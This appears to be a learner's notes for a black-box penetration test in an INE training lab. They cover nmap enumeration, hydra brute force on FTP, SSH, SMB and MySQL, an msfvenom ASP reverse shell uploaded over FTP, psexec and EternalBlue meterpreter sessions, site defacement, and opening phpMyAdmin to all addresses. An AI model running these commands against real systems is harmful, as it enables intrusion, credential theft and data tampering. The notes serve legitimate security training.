exit

Black box  Penetration Test 

To do: 
- `cat /etc/hosts `
- target: demo.ine.local 
10.2.19.218 


##### 1. Port scanning & enumeration 

- `Ping` target to check if we can communicate with the target
- perform `nmap` scan on target
	- basic scan: `nmap -sV ip `
	- `nmap  -T4 -PA -sC -sV -p 1-10000 target_ip -oX nmap_results_10k`
	- `nmap  -T4 -PA -sC -sV -p 1-65535 target_ip -oX nmap_results_65k` 
	- check udp port `nmap -sU -sV ip `
- Find out what is running on the target:
	- inspect pages that can be visited via browser 
- try to connect with a service:
	- `nc -nv target_ip target_port `

Output file in xml format can be imported in msfconsole 
Import findings in msfconsole: 
- `service postgresql start && msfconsole`
- create `workspace  `
- `db_import /root/Desktop/file/filename` (import results)
- `hosts` 
- `services`
- Get the exact operating system
	- `search smb_version`
	- `use aux/scanner/smb/smb_version`
	- ` set rhosts taret ip `
	- run (command `hosts` to check operating system)

#### Targeting Microsoft ISS FTP 

- Microsoft IIS - FTP is part of it the Microsoft IIS solution 
	- Microsoft ftp an microsoft IIS means that ftp is used to allow  authenticated users do modify the webserver directory

Steps:
1. identify vulnerability detection in regards with ftp: 
	- first check if anonymous logging is possible 
	    look for scripts: ` ls -al /usr/share/nmap/scripts/ | grep ftp- `
	    use script in nmap: `nmap -sV -p  --script=ftp-anon `
	    username: anonymous, password (geen) 

2.  ftp bruteforce attack with hydra
	- `hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt target_ip ftp `
	- check account: `hydra -l {username_youwanttofind}  -P /usr/share/wordlists/metasploit/unix_passwords.txt target_ip ftp ` or `hydra -l {username_youwanttofind}  -P /usr/share/wordlists/metasploit/unix_users.txt target_ip ftp `

3. use ftp ip port to connect to ftp server and use credentials found 

4. when you see an asp file you know the ftp client can TRY execute asp files 
	1. generate reverse shell with msfvenom 
		- `msfvenom -p windows/shell/reverse_tcp LHOST= your_ip LPORT= 1234 -f asp > shell.aspx `
	2. log back in into ftp server
		- put shell.aspx 
		- dir 

5. in different window start up multi/handler to receive the connection
	- `use multi/handler `
	- `set payload windows/shell/reverse_tcp `
	- in the browser: `ip/shell.aspx` 

if this did not work? 

pentester could try to deface the website: modify the webapplication or download client data - this is already something that should be reported. 
you could modify pages hosted 
get index.html
open the file in vim 
put index.html


#### Targeting OpenSSH 

Get the exact version of OpenSSH 

- `searchsploit OpenSSH version_number`
- burteforce: 
	- `hydra -l {username_youfound}  -P /usr/share/wordlists/metasploit/unix_users.txt target_ip ssh ` 
	- `hydra -l administrator  -P /usr/share/wordlists/metasploit/unix_users.txt target_ip ssh ` 
	- `hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.26.161 ssh`

	
	- - `unix_users.txt`: This file contains common usernames that are often used on Unix-based systems. You would use this list when **you want to try different usernames with known or common passwords**. For example, you might use a list of common usernames like "root," "admin," "user," etc., and then try various passwords with each of these usernames.
	- `unix_passwords.txt`: This file contains common passwords that are often used on Unix-based systems. You would use this list when you have a specific username that you want to test with a variety of common passwords

- ssh username@ip 
	- pwd - whoami - net localgroup - 
- msfconsole
	- search ssh_login 
	- use au/scanner/ssh/ssh_login 
	- upgrade shell 
	- windows cmd session in ssh : `bash` 
	- `net localgroup administrators `
	- `whoami /priv`


#### Targeting SMB 

- bruteforce: 
	- `hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt  target protocol `
- enumerate shares
	- `smbclient -L targetip -U username`
	- `smbmap -u vagrant -p vagrant -H targetip `
- enumerate user accounts `enum4linux -u username -p password -U ip ` 

 - msfconsole
	 - enumerate users: `smb_enumusers` 

###### PSexec

**Manual**
	psexec allows you to remotely authenticate via SMB with legitimate credentials
		- `locate psexec.py `
		- Copy the file to Desktop:` cp file_path rename_file   `
		- make the file executable so we can utilize it: `chmod +x psexec.py`
	- `python 3 psexec.py Administrator@ip `

**msfconsole** 
	- `search psexec `
	- `use exploit/windows/smb/psexec `
		- `set payload windows/x64/meterpreter/reverse_tcp`
		- `Sysinfo` 
		- `getuid`
		- `getprivs`


What to do when you don't have smb credentials? if you know that the device is running eternalblue: 
	- `search eternalblue `
	- `use exploit/windows/smb/psexec `


#### Targeting MySQL Database Server

msfconsole
	- `use/aux/scanner/mysql/mysql_login `
	- `set pass_file /usr/share.wordlists/metasploit/unix_password.txt`

login mysql database server:
- `mysql -u root -p -h ip `
- `show databases`;

visit ip and port in browser 
*use the credentials found with the bruteforce for mysql database server to get access to another server -> wordpress via phpmyadmin*


phpmyadmin (try to change configuration file)
- msfconsole (get elevated meterpreter session)
	- `use exploit/windows/smb/ms17_010_eternalblue`
	- C drive 
	- Navigate to the software stack's folder. For example, if using WAMP, you can navigate to the web root directory by typing:cd `C:\\wamp\\www`


											wordpress directory 
											cat contant of config.php
											contains mysql passwords 

**Modify phpMyAdmin Configuration file** 

- Search for the `phpmyadmin.conf` file that controls phpMyAdmin's access.
- Download the `phpmyadmin.conf` file to your local machine using the Meterpreter session.
- Open and edit the `phpmyadmin.conf` file. Make sure it allows access from all IP addresses.
- Upload the modified `phpmyadmin.conf` file back to the Meterpreter session using the `upload` command.
- Restart the Apache service to apply the changes:
    - Open a Windows command prompt within the Meterpreter session using `shell`.
    - Stop the Apache service with the command: `net stop wampapache`.
    - Start the Apache service again with: `net start wampapache`.
- Revisit the phpMyAdmin page in your browser; you should now have unrestricted access.
	- change the password![[Pasted image 20230914165333.png]]
- Log in to the WordPress site via phpMyAdmin using the MySQL credentials obtained earlier.




#### Targeting MySQL Database Server 
